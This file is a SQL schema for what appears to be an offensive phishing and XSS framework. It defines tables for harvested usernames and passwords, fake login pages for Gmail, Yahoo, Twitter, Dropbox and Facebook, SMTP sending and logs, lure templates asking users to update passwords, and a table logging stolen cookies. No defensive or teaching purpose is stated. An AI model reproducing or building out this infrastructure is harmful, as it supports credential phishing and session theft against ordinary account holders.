CREATE TABLE users(
    id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY NOT NULL,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(50) NOT NULL,
    email    VARCHAR(50) NOT NULL
);

CREATE TABLE phishing_module (
    id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    country  VARCHAR(5)   NOT NULL DEFAULT 'N/A',
    username VARCHAR(100) NOT NULL DEFAULT 'N/A',
    password VARCHAR(100) NOT NULL DEFAULT 'N/A',
    service  VARCHAR(100) NOT NULL DEFAULT 'N/A',
    ip_address VARCHAR(100) NOT NULL DEFAULT 'N/A',
    user_agent TEXT,
    http_referer TEXT,
    date DATETIME
);

CREATE TABLE phishing_pages (
    id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    service VARCHAR(100) NOT NULL DEFAULT 'Unknown',
    filename VARCHAR(100) NOT NULL DEFAULT 'Unknown',
    description TEXT,
    url TEXT
);

INSERT INTO phishing_pages(service,filename,description,url) VALUES('Gmail','gmail.old.login.php','Old Gmail phishing page.','http://localhost/framework/pages/gmail.old.login.php');
INSERT INTO phishing_pages(service,filename,description,url) VALUES('Yahoo','yahoo.login.php','Yahoo login phishing page.','http://localhost/framework/pages/yahoo.login.php');
INSERT INTO phishing_pages(service,filename,description,url) VALUES('Twitter','twitter.login.php','Twitter login phishing page.','http://localhost/framework/pages/twitter.login.php');
INSERT INTO phishing_pages(service,filename,description,url) VALUES('Twitter','twitter.php','Twitter home phishing page.','http://localhost/framework/pages/twitter.php');
INSERT INTO phishing_pages(service,filename,description,url) VALUES('Dropbox','dropbox.login.php','Dropbox login phishing page.','http://localhost/framework/pages/dropbox.login.php');
INSERT INTO phishing_pages(service,filename,description,url) VALUES('Facebook','facebook.login.php','Facebook login phishing page.','http://localhost/framework/pages/facebook.login.php');

CREATE TABLE exploits_module (
    id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    exploit_name VARCHAR(100) NOT NULL,
    exploit_description TEXT,
    exploit_url TEXT
);

CREATE TABLE notes_module (
    id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    note_name VARCHAR(100) NOT NULL,
    note_content TEXT
);

INSERT INTO notes_module(note_name,note_content) VALUES('lyrics 1','I found myself a cheerleader 1');
INSERT INTO notes_module(note_name,note_content) VALUES('lyrics 2','I found myself a cheerleader 2');


CREATE TABLE ip_capturer_module (
    id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    country VARCHAR(10) DEFAULT '--',
    ip_address VARCHAR(50) DEFAULT '--',
    user_agent TEXT,
    get_content TEXT,
    http_referer TEXT,
    date DATETIME
);

CREATE TABLE url_shortner_module(
    id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    original_url TEXT NOT NULL,
    short_url   VARCHAR(100) NOT NULL DEFAULT '--'
);


CREATE TABLE smtp_servers(
    id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    smtp_name VARCHAR(100) NOT NULL DEFAULT 'N/A',
    smtp_server   VARCHAR(124) NOT NULL DEFAULT 'mail.example.com',
    smtp_port   INT UNSIGNED NOT NULL DEFAULT '25',
    smtp_username VARCHAR(124) NOT NULL DEFAULT 'username@example.com',
    smtp_password VARCHAR(124) NOT NULL DEFAULT 'password',
    smtp_auth   INT NOT NULL DEFAULT '1'
);

CREATE TABLE smtp_log(
    id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    smtp_from_email VARCHAR(255) NOT NULL,
    smtp_from_name VARCHAR(255) NOT NULL,
    smtp_to_email TEXT NOT NULL,
    smtp_to_name VARCHAR(255) NOT NULL,
    smtp_message_subject VARCHAR(255) NOT NULL,
    smtp_message_content TEXT,
    smtp_sent   VARCHAR(4) NOT NULL,
    smtp_error TEXT
);

CREATE TABLE mail_templates(
    id INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY,
    template_name VARCHAR(100) NOT NULL,
    template_description TEXT,
    template_subject VARCHAR(255) NOT NULL,
    template_content TEXT
);

INSERT INTO mail_templates(template_name,template_subject,template_content,template_description) VALUES('Outlook','Outlook Support','<h3>Hola</h3>','requiring the user to update his password.');
INSERT INTO mail_templates(template_name,template_subject,template_content,template_description) VALUES('Facebook','Facebook','<h3>Hola Facebook!</h3>','requiring the user to update his password for security.');

CREATE TABLE xss_module (
    id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY NOT NULL,
    ip_addr VARCHAR(50) DEFAULT '--',
    remote_port int(15),
    user_agent VARCHAR(255) DEFAULT '--',
    date DATETIME,
    cookie TEXT
);

